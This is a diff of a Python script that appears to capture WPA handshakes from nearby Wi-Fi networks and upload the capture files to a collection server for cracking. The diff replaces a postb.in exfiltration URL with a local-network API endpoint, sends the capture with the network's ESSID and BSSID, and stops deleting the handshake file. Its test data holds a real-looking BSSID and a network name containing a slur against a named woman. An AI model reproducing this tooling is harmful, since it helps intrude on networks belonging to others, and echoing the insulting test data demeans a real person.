@@ -6,7 +6,11 @@ import XMLHelper
 import JSONHelper
 import requests
 
-SERVER_ADDR = "https://postb.in/1602363645786-8894055658020"
+import json
+import os
+
+SERVER_ADDR = 'http://192.168.43.88:8000/api/networks/'
+HANDSHAKE_PATH = 'output/-01.cap'
 
 #reset
 def reset():
@@ -57,10 +61,14 @@ def getDevices(network):
 #-----STEP 3-----#
 #Send handshake
 def sendHandshake(network):
-    name = network['essid'] + '_handshake.cap'
-    with open('./output/-01.cap','rb') as f:
-        r = requests.post(SERVER_ADDR,files={name: f})
-    ShellHelper.rmHandshake()
+    network = {
+        "essid" : network['essid'],
+        "bssid" : network['bssid'],    
+    }
+
+    file = {'file' : open(HANDSHAKE_PATH,'rb')}
+    r = requests.post(SERVER_ADDR, files=file, data=network)
+    #ShellHelper.rmHandshake()
 
 #Get Handshake
 def getAndSendHandshake(network,mac):
@@ -70,14 +78,17 @@ def getAndSendHandshake(network,mac):
     sendHandshake(network)
     reset()
 
+
+
 #For testing
 def main():
     network = {
-        "encryption":"WPA,AES-CCM,TKIP",
-        "essid": "SFR_9D10",
-        "bssid": "60:35:C0:3A:9D:16",
-        "channel": "1"
+            "encryption": "WPA",
+            "essid": "iPhone de Clara la PUTE",
+            "bssid": "B4:C4:FC:63:56:CC",
+            "channel": "5"
     }
+    
     sendHandshake(network)
 
 if __name__ == "__main__":
